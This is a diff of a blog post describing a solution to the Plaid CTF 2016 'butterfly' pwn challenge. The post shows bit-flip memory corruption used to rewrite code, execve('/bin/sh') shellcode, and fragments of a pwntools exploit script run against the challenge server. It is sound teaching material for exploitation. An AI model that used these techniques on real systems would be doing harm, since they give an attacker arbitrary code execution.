@@ -1,28 +1,35 @@
 ---
 layout: post
-title: "PlaidCTF - butterfly"
+title: "Plaid CTF 2016 - butterfly"
 date: 2016-04-18 02:00
 categories: ctf exploit
 ---
 
-Here is a solution to the second pwn challenge `butterfly`. This is not your usual buffer overflow, but rather a nice demonstration on how bit flips can be dangerous!
+*Here is a solution to the second pwn challenge `butterfly`. This is not your usual buffer overflow, but rather a nice demonstration on how bit flips can be dangerous!*
+
 <!--more-->
 
-# Basic information
+### Description
 
-From the organizers:
+*Sometimes the universe smiles upon you. And sometimes, well, you just have to roll your sleeves up and do things yourself. Running at butterfly.pwning.xxx:9999*
 
-```
-Pwnable (150 pts)
+*Notes: The binary has been updated. Please download again if you have the old
+version. The only difference is that the new version (that's running on the
+server) has added setbuf(stdout, NULL); line*
 
-Sometimes the universe smiles upon you. And sometimes, well, you just have to roll your sleeves up and do things yourself. Running at butterfly.pwning.xxx:9999
+### Details
 
-Notes: The binary has been updated. Please download again if you have the old version. The only difference is that the new version (that's running on the server) has added setbuf(stdout, NULL); line.
-```
+Points:      150
+
+Category:    Pwnable
+
+Validations: 99
+
+### Solution
 
 We have an unstripped ELF 64-bit executable with stack canaries and NX enabled.
 
-```
+```bash
 $ file butterfly
 butterfly: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically
 linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32,
@@ -34,9 +41,6 @@ No RELRO        Canary found      NX enabled    No PIE          No RPATH
 RUNPATH      FILE
 No RUNPATH   butterfly
 ```
-
-# Operation
-
 There is only one function which is the `main`:
 
 ```
@@ -167,7 +171,7 @@ The `call` instruction is the opcode `e8` that takes a relative offset as argume
 
 Let's change the opcode from `e824feffff` to `e864feffff` and see the result with [`shellnoob`][shellnoob]:
 
-```
+```bash
 $ shellnoob --64 --intel -i --to-asm
 opcode_to_asm selected (type "quit" or ^C to end)
 >> e824feffff
@@ -190,14 +194,14 @@ It has to be multiplied by 8:
 
 Now we need to control which bit is flipped in the targeted byte. With the python interpreter:
 
-```
+```python
 >>> bin(0x24^0x64)
 '0b1000000'
 ```
 
 This is the sixth bit (we start at 0). If we send the number `0x20041c6` to the binary we should see the call change:
 
-```
+```bash
 $ gdb -q butterfly
 Reading symbols from butterfly...(no debugging symbols found)...done.
 gdb-peda$ r
@@ -231,7 +235,7 @@ syscall
 
 Back with `shellnoob`:
 
-```
+```bash
 $ shellnoob --64 --intel -i --to-opcode
 asm_to_opcode selected (type "quit" or ^C to end)
 >> xor rsi, rsi; mov rax, 59; xor rdx, rdx; mov rdi, 0x400914; syscall
@@ -248,7 +252,7 @@ Now either you go the long way and compute all the bit flips needed by hand or y
 
 The script has to compute all the bit flips needed to change a portion of the existing instruction into the shellcode and the first 8 bytes of the greeting strings into `/bin/sh\0`. Once the bit flips for a certain byte are computed, we need to revert the algorithm that derives the address from the input and send a number for each flip needed inside the byte.
 
-```
+```python
 #!/usr/bin/env python2
 
 from pwn import *
@@ -309,7 +313,7 @@ r.interactive()
 
 Let's execute it:
 
-```
+```bash
 $ ./payload.py 
 [+] Opening connection to butterfly.pwning.xxx on port 9999: Done
 [*] Switching to interactive mode 
